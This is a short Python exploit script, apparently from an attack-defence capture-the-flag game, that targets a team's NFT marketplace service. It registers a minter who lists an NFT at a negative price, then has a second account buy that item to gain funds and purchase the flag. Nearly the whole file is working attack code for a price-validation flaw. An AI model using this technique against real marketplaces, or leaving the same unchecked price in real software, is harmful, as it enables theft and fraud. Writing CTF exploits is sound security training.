#!/usr/bin/env python3

import sys
from service1_common import *


def exploit(ip, flag_id):
    # Mint NFT with negative price
    u1, p1 = randstr(10), randstr(10)
    client1 = Client(ip, u1, p1)
    client1.register_user()
    client1.login_user_minter()
    nft_id = client1.mint_nft("prova", "not interesting", -10000000, "true")

    # Buy the negative price NFT to get money, and buy the flag
    u2, p2 = randstr(10), randstr(10)
    client2 = Client(ip, u2, p2)
    client2.register_user()
    client2.buy_nft(nft_id)
    resp = client2.buy_nft(flag_id)
    return "\n".join(find_flag(resp.text))


if __name__ == "__main__":
    team_id = sys.argv[1]
    flag_id = sys.argv[2]
    ip = f"10.60.{team_id}.1"
    print(exploit(ip, flag_id))
